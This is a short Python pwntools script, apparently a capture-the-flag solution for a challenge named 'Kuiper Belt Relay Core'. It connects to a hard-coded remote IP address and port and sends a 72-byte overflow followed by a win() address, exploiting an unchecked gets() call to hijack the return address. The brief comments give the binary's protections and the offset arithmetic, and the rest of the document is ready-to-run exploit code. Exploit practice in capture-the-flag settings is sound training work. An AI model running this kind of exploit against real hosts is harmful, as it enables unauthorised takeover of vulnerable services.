#!/usr/bin/env python3
"""Kuiper Belt Relay Core — ret2win via gets() overflow."""

from pwn import *

HOST = "34.116.80.78"
PORT = 9998

# Remote binary: no PIE, no stack canary, NX on.
# vuln(): char buffer[64]; gets(buffer);
# offset to saved RIP = 64 (buffer) + 8 (saved RBP) = 72
# win() is never called; entry found by scanning the mapped .text page.
WIN = 0x401215

def main():
    context.arch = "amd64"
    io = remote(HOST, PORT)
    io.recvuntil(b"Enter your message: ")
    io.sendline(b"A" * 72 + p64(WIN))
    print(io.recvall(timeout=3).decode(errors="replace"))

if __name__ == "__main__":
    main()
